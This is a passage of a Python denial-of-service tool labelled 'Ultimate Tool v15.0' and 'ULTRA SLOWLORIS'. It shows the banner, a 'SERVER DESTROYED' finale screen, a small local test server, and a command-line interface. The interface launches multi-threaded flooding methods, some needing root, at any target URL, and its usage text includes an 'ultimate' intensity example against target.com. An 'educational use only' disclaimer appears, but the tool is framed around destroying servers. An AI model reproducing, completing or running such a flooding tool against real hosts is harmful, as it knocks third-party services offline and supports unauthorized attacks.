{Colors.RED}║{Colors.WHITE}   ██║   ██║██║  ██║╚══██╔══╝██║████╗ ████║██║   ██║╚══██╔══╝   {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}   ██║   ██║███████║   ██║   ██║██╔████╔██║██║   ██║   ██║      {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}   ██║   ██║██╔══██║   ██║   ██║██║╚██╔╝██║██║   ██║   ██║      {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}   ╚██████╔╝██║  ██║   ██║   ██║██║ ╚═╝ ██║╚██████╔╝   ██║      {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.WHITE}    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝     ╚═╝ ╚═════╝    ╚═╝      {Colors.RED}║{Colors.END}
{Colors.RED}╠═══════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}║{Colors.CYAN}  🎯 TARGET: {target:<53}  {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  🔥 INTENSITY: {intensity.upper():<10} | THREADS: {cfg['threads']*cfg['multiplier']:>4.0f}                    {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.CYAN}  ⚡ METHODS: {', '.join(methods):<45}  {Colors.RED}║{Colors.END}
{Colors.RED}║{Colors.GREEN}  🐌 ULTRA SLOWLORIS v15.0 - MAXIMUM OVERDRIVE!                   {Colors.RED}║{Colors.END}
{Colors.RED}╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
        print(banner)

    def print_death_finale(self):
        """Print finale"""
        elapsed = time.time() - self.start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)

        finale = f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════╗
║                    💀 SERVER DESTROYED! 💀                         ║
╠═══════════════════════════════════════════════════════════════════╣
║  🎯 FINAL HITS:        {self.hit_tracker.hit_count:<10}                              ║
║  ⏱️  TIME:             {minutes}m {seconds}s                                      ║
║  ⚡ AVG RATE:          {self.hit_tracker.hit_count/elapsed:.1f}/s                                 ║
║  📦 TOTAL PACKETS:     {self.stats['total']:<10}                              ║
║  ❌ ERRORS:            {self.stats['errors']:<10}                              ║
╠═══════════════════════════════════════════════════════════════════╣
║  HIT BREAKDOWN:                                                  ║"""

        hit_summary = self.hit_tracker.get_summary()
        for method, count in sorted(hit_summary.items(), key=lambda x: x[1], reverse=True):
            pct = (count / self.hit_tracker.hit_count * 100) if self.hit_tracker.hit_count > 0 else 0
            bar = '█' * int(pct/5) + '░' * (20-int(pct/5))
            finale += f"\n║  {method:<12}: {count:>8} [{bar}] {pct:>5.1f}%      ║"

        finale += f"""
╠═══════════════════════════════════════════════════════════════════╣
║  🔥 MISSION COMPLETE - ULTRA TOOL v15.0                           ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}"""
        print(finale)

# ==================== TEST SERVER ====================
class TestServer:
    """Simple test server"""

    def __init__(self, port=8080):
        self.port = port
        self.running = False
        self.server = None
        self.hit_count = 0
        self.start_time = None
        self.lock = threading.Lock()

    def start(self):
        self.running = True
        self.start_time = time.time()

        def handle_client(client, addr):
            with self.lock:
                self.hit_count += 1
                current_hit = self.hit_count
            
            try:
                data = client.recv(4096)
                if not data:
                    client.close()
                    return

                # Simple HTTP response
                body = f"<h1>Hit #{current_hit}</h1><p>Uptime: {int(time.time()-self.start_time)}s</p>"
                response = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
                client.send(response.encode())
            except:
                pass
            finally:
                try:
                    client.close()
                except:
                    pass

        def run():
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                self.server.bind(('0.0.0.0', self.port))
                self.server.listen(500)  # High backlog
            except Exception as e:
                print(f"{Colors.RED}[!] Failed to bind port {self.port}: {e}{Colors.END}")
                return

            print(f"{Colors.GREEN}[+] Test server on port {self.port}{Colors.END}")
            print(f"{Colors.GREEN}[+] Test: python3 7.py -t http://localhost:{self.port} -i ultimate -m SLOWLORIS{Colors.END}")

            while self.running:
                try:
                    self.server.settimeout(1)
                    client, addr = self.server.accept()
                    threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue
                except:
                    break

        threading.Thread(target=run, daemon=True).start()

    def stop(self):
        self.running = False
        if self.server:
            try:
                self.server.close()
            except:
                pass
        print(f"{Colors.RED}[!] Server stopped. Total hits: {self.hit_count}{Colors.END}")

# ==================== MAIN ====================
def main():
    def signal_handler(sig, frame):
        print(f"\n{Colors.YELLOW}[!] Stopping...{Colors.END}")
        if 'hammer' in globals():
            hammer.running = False
            hammer.cleanup()
        if 'test_server' in globals():
            test_server.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    parser = argparse.ArgumentParser(description='Ultimate Tool v15.0', add_help=False)
    parser.add_argument('-t', '--target', help='Target URL')
    parser.add_argument('-i', '--intensity', default='ultimate',
                       choices=['low', 'medium', 'high', 'seven', 'ultimate'])
    parser.add_argument('-m', '--methods', nargs='+', choices=[m.name for m in AttackMethod])
    parser.add_argument('--list-methods', action='store_true')
    parser.add_argument('--start-server', action='store_true')
    parser.add_argument('--server-port', type=int, default=8080)
    parser.add_argument('-h', '--help', action='store_true')

    args = parser.parse_args()

    if args.start_server:
        global test_server
        test_server = TestServer(port=args.server_port)
        test_server.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            test_server.stop()
        return

    if args.list_methods:
        print(f"\n{Colors.CYAN}Available Methods:{Colors.END}\n")
        for method in AttackMethod:
            cfg = method.value
            root = "🔴 ROOT" if cfg.requires_root else "✅ USER"
            print(f"  {method.name:<12} - {cfg.description:<35} [{root}]")
        print()
        return

    if args.help or not args.target:
        print(f"""
{Colors.CYAN}ULTIMATE STRESS TESTER v15.0 - ULTRA FAST MODE{Colors.END}

{Colors.GREEN}USAGE:{Colors.END}
  python3 7.py -t <target> -i <intensity> [-m METHOD ...]

{Colors.YELLOW}EXAMPLES:{Colors.END}
  # Start test server
  python3 7.py --start-server

  # Slowloris only - ULTRA FAST
  python3 7.py -t http://localhost:8080 -i ultimate -m SLOWLORIS

  # All methods
  python3 7.py -t http://target.com -i ultimate

{Colors.CYAN}INTENSITIES:{Colors.END} low, medium, high, seven, ultimate

{Colors.RED}⚠️  EDUCATIONAL USE ONLY - TEST YOUR OWN SERVERS{Colors.END}
""")
        return

    if not args.target.startswith(('http://', 'https://')):
        args.target = f"http://{args.target}"

    global hammer
    hammer = UltimateHammer()

    try:
        hammer.infinite_combo(args.target, args.intensity, args.methods)
    except Exception as e:
        print(f"{Colors.RED}[!] Fatal error: {e}{Colors.END}")
        hammer.cleanup()

if __name__ == "__main__":
    main()

